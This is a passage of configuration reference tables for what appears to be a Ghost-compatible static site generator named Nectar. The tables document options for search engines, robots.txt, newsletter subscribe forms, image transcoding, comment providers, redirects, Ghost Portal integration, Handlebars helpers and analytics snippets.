| `components.search.engine` | `"json" \| "pagefind" \| "json+pagefind" \| "lunr" \| "json+lunr" \| "sodo-search" \| "json+sodo-search"` | no | `"json"` | Search backend. `json` emits only the flat index (cheap, zero deps, works for small/medium sites). `pagefind` skips the JSON and runs the `pagefind` CLI for a chunked index that scales to large archives. `json+pagefind` emits both so the consumer can pick at runtime. `lunr` pre-builds a Lunr index (`search-index.json`) and ships a tiny vanilla-JS widget — meant for sites under a few hundred posts where Pagefind's WASM overhead is overkill. `json+lunr` emits both the raw fuzzy-search index and the pre-built Lunr index plus widget. `sodo-search` injects Ghost's `@tryghost/sodo-search` client script into `{{ghost_head}}` so themes that ship a `<button data-ghost-search>` trigger (Source, Casper) light up against the Ghost-style search UI; the script reads from the same `content/search.json` we emit, so combine with `json+sodo-search` if you want both the raw index file and the bundled UI script. |
| `components.search.sodo_search_src` | `string` | no | `"https://unpkg.com/@tryghost/sodo-search@latest/umd/sodo-search.min.js"` | URL of the Sodo Search client script injected when `engine` is `sodo-search` or `json+sodo-search`. Defaults to the unpkg-hosted `@tryghost/sodo-search` bundle; override to self-host the file or pin a specific version. The URL is emitted verbatim into a `<script src="…">` attribute, so it must be a value the operator trusts. |
| `components.search.excerpt_words` | `number` | no | `30` | Maximum number of words from `custom_excerpt` (or auto-excerpt) included in each entry. Keeps `search.json` small so a multi-hundred-post site still ships in a single fetch. `0` omits excerpts entirely. |
| `components.search.include_pages` | `boolean` | no | `true` | Include static pages in `search.json`. Set to `false` to index posts only. |
| `components.search.include_tags` | `boolean` | no | `true` | Include public tags in `search.json` so a search UI can surface tag pages alongside posts. |
| `components.search.include_authors` | `boolean` | no | `true` | Include authors in `search.json` so a search UI can surface author pages. |
| `components.search.pagefind_bin` | `string` | no | — | Optional path or command for the `pagefind` CLI. Defaults to `pagefind` resolved via `PATH`. Only consulted when `engine` includes `pagefind`. |
| `components.search.emit_algolia_records` | `boolean` | no | `false` | Emit `dist/.nectar/algolia-records.json` — a flat array of posts/pages/tags/authors with `objectID`, `url`, `title`, `content`, `type`, `tags`, `authors`. Push to your Algolia index with the `algoliasearch` CLI / SDK; Nectar does not push for you. Independent of `engine`: combine with any engine to get Algolia-pushable records alongside the on-site widget. A starter DocSearch-compatible stylesheet ships at `search/algolia-docsearch.css`. |
| `components.search.emit_meilisearch_records` | `boolean` | no | `false` | Emit `dist/.nectar/meilisearch-records.json` — the same flat document set used for Algolia but with Meilisearch-safe IDs (colon-free, `[a-zA-Z0-9-_]` only) under the `id` primary key. Push with the `meilisearch-js` SDK or HTTP API; Nectar does not push for you. Independent of `engine`. |

## `components.robots`

robots.txt component.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.robots.enabled` | `boolean` | no | `true` | Emit a `robots.txt` file. |
| `components.robots.disallow` | `boolean` | no | `false` | When true, emit a `Disallow: /` robots.txt to block all crawling. Useful for staging. |

## `components.subscribe`

Newsletter subscribe form component.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.subscribe.provider` | `"none" \| "buttondown" \| "beehiiv" \| "mailchimp" \| "custom"` | no | `"none"` | Subscribe form provider. `none` neutralises any `data-members-form` and may strip wrapping selectors. `buttondown` / `beehiiv` / `mailchimp` rewrite the form action to the provider's embed / API endpoint. `custom` lets the operator supply a raw `action` and optional `field_map`. |
| `components.subscribe.action` | `string` | no | — | Form action URL. Required when `provider` is `custom`; inferred for known providers when omitted. |
| `components.subscribe.username` | `string` | no | — | Provider username (e.g. Buttondown username, Mailchimp list u/id segment). |
| `components.subscribe.publication_id` | `string` | no | — | Beehiiv publication id (UUID). The form action is rewritten to `https://api.beehiiv.com/v2/publications/<publication_id>/subscriptions`. Falls back to `username` when omitted for back-compat with operators who only have a slug. |
| `components.subscribe.email_field_name` | `string` | no | — | Name of the email input field. Defaults to a provider-appropriate value. |
| `components.subscribe.field_map` | `record<string, string>` | no | — | Custom provider only. Map of logical field name -> form field name. Today only the `email` key is consulted (it overrides `email_field_name` when set); reserved for future hidden / honeypot fields without a schema bump. |
| `components.subscribe.strip_selectors` | `array<string>` | no | — | `provider = "none"` only. CSS selectors of wrapping elements to remove from the rendered HTML (e.g. `.gh-footer-signup`, `.gh-cta`). Supports `.class`, `#id`, and `tag` selectors. Use to delete CTA blocks that would otherwise advertise a signup flow that does nothing. |

## `components.images`

Per-format image transcoder. Generates WebP/AVIF variants of responsive widths and rewrites `<img>` into `<picture>` so themes get modern-format fallback automatically.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.images.enabled` | `boolean` | no | `true` | Emit per-format image variants (WebP/AVIF) for jpg/png sources alongside the same-format responsive widths and wrap `<img>` in `<picture>` for browser fallback. Requires `sharp`; when sharp is not installed the `<picture>` wrap is skipped so themes keep working with the original `<img>`. |
| `components.images.resize` | `boolean` | no | `true` | Generate same-format resized variants (`/content/images/size/wXXX[hYYY]/<path>`) for theme `image_sizes` and the default responsive widths. Requires `sharp`; when sharp is not installed the pass is skipped with a warning and `<img>` srcset URLs may 404 (browsers fall back to the original `src`). Set to `false` to opt out of the resize pipeline entirely (e.g. when source images are already pre-resized or the project does not want a sharp dependency). |
| `components.images.formats` | `array<"webp" \| "avif">` | no | `["webp"]` | Image formats to transcode the responsive variants into. Order matters: the first entry is preferred by browsers that understand it. |
| `components.images.webp_quality` | `number` | no | `80` | Quality factor passed to sharp when encoding WebP variants. |
| `components.images.avif_quality` | `number` | no | `50` | Quality factor passed to sharp when encoding AVIF variants. AVIF is much slower than WebP, so default is conservative. |
| `components.images.cache_dir` | `string` | no | `".nectar-cache/images"` | Directory (relative to the project root) where transcoded variants are cached by content hash so unchanged sources skip re-encoding on the next build. |

## `components.comments`

Comments component. Field set used depends on `provider`.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.comments.provider` | `"off" \| "giscus" \| "disqus" \| "utterances" \| "webmention.io"` | no | `"off"` | Comments provider. `off` disables comments and renders `{{comments}}` as empty. |
| `components.comments.repo` | `string` | no | — | Giscus / Utterances: `owner/name` GitHub repository hosting the discussion. |
| `components.comments.repo_id` | `string` | no | — | Giscus: opaque repository ID from giscus.app. |
| `components.comments.category` | `string` | no | — | Giscus: discussion category name. |
| `components.comments.category_id` | `string` | no | — | Giscus: opaque discussion category ID from giscus.app. |
| `components.comments.mapping` | `string` | no | — | Giscus: page-to-discussion mapping strategy (`pathname`, `url`, `title`, etc.). |
| `components.comments.strict` | `boolean` | no | — | Giscus: use strict mapping (exact match only). |
| `components.comments.reactions_enabled` | `boolean` | no | — | Giscus: enable reactions on discussions. |
| `components.comments.emit_metadata` | `boolean` | no | — | Giscus: emit discussion metadata to the parent page. |
| `components.comments.input_position` | `"top" \| "bottom"` | no | — | Giscus: place the comment composer above or below the thread. |
| `components.comments.theme` | `string` | no | — | Giscus: theme name or URL applied to the embedded widget. |
| `components.comments.lang` | `string` | no | — | Giscus / Disqus: BCP 47 language tag for the comments UI. |
| `components.comments.loading` | `"lazy" \| "eager"` | no | — | Giscus: iframe loading strategy. |
| `components.comments.issue_term` | `string` | no | — | Utterances: how to map pages to issues (e.g. `pathname`, `url`, `title`). |
| `components.comments.label` | `string` | no | — | Utterances: GitHub issue label applied to comment threads. |
| `components.comments.shortname` | `string` | no | — | Disqus: site shortname. |
| `components.comments.identifier` | `string` | no | — | Disqus: per-page identifier override. Defaults to the post slug. |
| `components.comments.username` | `string` | no | — | webmention.io: account username receiving webmentions. |

## `components.redirects`

Component-level redirects emitter. Loads Ghost-compatible `content/data/redirects.{yaml,yml,json}` (Ghost migration drop-in: flat `[{from,to,permanent}]` or status-keyed `{301: [...], 302: [...]}`) and the canonical project-root `redirects.yaml`, then emits a single `_redirects` file in Netlify / Cloudflare Pages format. Independent of deploy-target toggles so migrated redirect history survives regardless of host.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.redirects.enabled` | `boolean` | no | `true` | Load `redirects.yaml` (project root) and Ghost-style `content/data/redirects.{yaml,yml,json}` and emit a `_redirects` file at the publish root in the Netlify / Cloudflare Pages format (`<from>  <to>  <status>`). Independent of `[deploy.cloudflare_pages]` and `[deploy.netlify]`: those toggles still gate their own emitters which add platform-specific shape (e.g. Netlify `force` suffix), but this component runs unconditionally so a Ghost migration retains its redirect history regardless of which host the build targets. Set to `false` to suppress the component-level emit entirely. |
| `components.redirects.emit_html` | `boolean` | no | `false` | In addition to `_redirects`, write a static HTML `meta http-equiv="refresh"` page at `<from>/index.html` for every rule. Use this when deploying to a host that does NOT honor `_redirects` (GitHub Pages, S3 static-website without routing rules, plain Apache without mod_rewrite). HTTP status codes are NOT preserved by HTML refresh — every redirect becomes a 200 + client-side jump — so prefer the `_redirects` file whenever the host supports it. |

## `components.portal`

Ghost Members / Portal compatibility. Static-only, but the flags it exposes on `@site` (`members_enabled`, `paid_members_enabled`, `members_invite_only`) are what Source-style themes branch on for sign-in UI, sidebar CTAs, and footer links. When `provider` names an external newsletter service (buttondown / beehiiv / substack / convertkit / bentonow / mailerlite) or `custom` with explicit URLs, Nectar additionally rewrites the dead `data-portal="signup"` / `"signin"` / `"account"` / `"upgrade"` buttons shipped by Ghost themes so they deep-link to the configured backend.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.portal.provider` | `"none" \| "ghost" \| "custom" \| "buttondown" \| "beehiiv" \| "substack" \| "convertkit" \| "bentonow" \| "mailerlite"` | no | `"none"` | Members / Portal backend. `none` keeps `@site.members_enabled` off so Source theme hides every sign-in / subscribe button. `ghost` wires the `#/portal/*` href hashes that Ghost's own Portal script intercepts (no rewrite). `custom` keeps the same UI surface but lets the embedder swap in their own client-side handler — if any `*_url` field is set the corresponding `data-portal` button is rewritten to that link, otherwise the original href is left alone. The remaining providers (`buttondown`, `beehiiv`, `substack`, `convertkit`, `bentonow`, `mailerlite`) are external newsletter / membership services: Nectar rewrites the dead `data-portal="signup"` / `"signin"` / `"account"` / `"upgrade"` buttons emitted by Ghost themes to point at the provider's hosted pages, inferring URLs from `publication` for providers with conventional URL shapes and falling back to the explicit `*_url` overrides otherwise. |
| `components.portal.paid` | `boolean` | no | `false` | Whether paid tiers are available. Drives `@site.paid_members_enabled`, which Source's sidebar uses to decide between Subscribe and Upgrade CTAs. Only meaningful when `provider != "none"`. |
| `components.portal.invite_only` | `boolean` | no | `false` | When true, hide the public Subscribe button and only expose Sign in (Ghost's invite-only mode). Drives `@site.members_invite_only`. Only meaningful when `provider != "none"`. |
| `components.portal.publication` | `string` | no | — | Provider-specific publication identifier used to infer default URLs. Buttondown / Beehiiv / Substack treat it as the publication slug (e.g. `my-newsletter`); ConvertKit treats it as a form id; Bento and MailerLite have no canonical URL shape, so their builds require explicit `*_url` overrides instead. Ignored for `provider = "none"` / `"ghost"` / `"custom"`. |
| `components.portal.signup_url` | `string` | no | — | Override for the URL injected into `data-portal="signup"` triggers (Ghost's Subscribe button). When unset and the active provider can infer one from `publication`, the inferred URL is used; otherwise the button is left untouched. |
| `components.portal.signin_url` | `string` | no | — | Override for the URL injected into `data-portal="signin"` triggers (Ghost's Sign in link). |
| `components.portal.account_url` | `string` | no | — | Override for the URL injected into `data-portal="account"` triggers (Ghost's Account link, shown to already-signed-in members). |
| `components.portal.upgrade_url` | `string` | no | — | Override for the URL injected into `data-portal="upgrade"` triggers (Ghost's paid-tier Upgrade CTA). Typically a checkout / pricing page. |
| `components.portal.inject_script` | `boolean` | no | `false` | When true, inject Ghost's Portal client script into every page via `{{ghost_head}}`. The script attaches `data-portal` click handlers (signup / signin / account / upgrade) and renders the modal UI without any further wiring. Defaults to `false` so plain static blogs ship no extra JS; flip on to wire up Ghost Portal against a real backend (Ghost server, ghost-static-portal, or any self-hosted fork). Independent of `provider`: combining `inject_script = true` with `provider = "ghost"` is the canonical Ghost-compat setup, but the flag also works alongside `provider = "custom"` when the operator wires their own handler script through `script_src`. |
| `components.portal.script_src` | `string` | no | `"https://unpkg.com/@tryghost/portal@latest/umd/portal.min.js"` | URL of the Portal client script injected when `inject_script = true`. Defaults to the canonical unpkg-hosted `@tryghost/portal` bundle; override to self-host the file (`/assets/portal.min.js`) or pin a specific version (`https://unpkg.com/@tryghost/portal@2.x/...`). The URL is emitted verbatim as the `<script src="…">` attribute and dropped into the rendered HTML, so it must be a value the operator trusts. |

## `components.helpers`

Lightweight extension point for registering Handlebars helpers from a config-listed file without writing a full plugin. The build dynamic-imports each `paths[]` entry and registers its exports as helpers on the render engine.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.helpers.paths` | `array<string>` | no | `[]` | Optional list of JavaScript / TypeScript files (relative to the project root) that export Handlebars helpers. Each module is dynamic-imported at build start; named exports become helpers registered under the export name, and a `default` export shaped `{ name: string, fn: Function }` (or `Record<string, Function>`) is registered accordingly. Thin sugar over writing a plugin that calls `engine.registerHelper`; for anything more involved than a couple of pure-function helpers, prefer a real plugin. |

## `components.analytics`

Drop-in analytics snippet. When `provider` is set, the corresponding script tag (and any `<noscript>` fallback) is appended to every page's `{{ghost_head}}` output. Privacy concerns (Do-Not-Track honouring, IP anonymisation, cookie banners) are the provider's responsibility — Nectar only emits the documented embed snippet verbatim.

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `components.analytics.provider` | `"none" \| "plausible" \| "umami" \| "fathom" \| "simpleanalytics" \| "googleanalytics"` | no | `"none"` | Analytics backend whose tracking snippet is injected into every page via `{{ghost_head}}`. `none` skips injection. For `plausible` / `umami` / `fathom` / `simpleanalytics`, `site` is the domain / website ID / site ID used by the provider. For `googleanalytics`, `site` is the GA4 measurement id (e.g. `G-XXXXXXXX`). DNT and IP anonymisation are handled by the provider itself; consult their docs to opt in. |
| `components.analytics.site` | `string` | no | — | Provider-specific identifier embedded in the analytics snippet. Plausible: domain (e.g. `example.com`). Umami: data-website-id (UUID). Fathom: data-site (e.g. `ABCDEFGH`). Google Analytics: measurement id (e.g. `G-XXXXXXXX`). Simple Analytics does not require a site id; the field is ignored. Required when `provider` is anything other than `none` / `simpleanalytics`. |
